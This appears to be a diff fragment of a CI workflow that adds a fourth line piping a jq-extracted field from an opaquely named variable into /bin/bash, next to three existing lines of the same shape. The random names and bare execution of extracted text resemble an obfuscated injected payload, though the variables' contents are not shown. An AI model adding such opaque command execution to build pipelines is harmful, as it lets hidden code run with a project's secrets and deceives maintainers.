@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$xgitv7" | jq -r .lcn711 | /bin/bash
           echo $wb4492 | jq -r .my2 | /bin/bash
           echo $prww09008 | jq -r .ddv8115 | /bin/bash
+          echo $ehswi0 | jq -r .cd41534 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
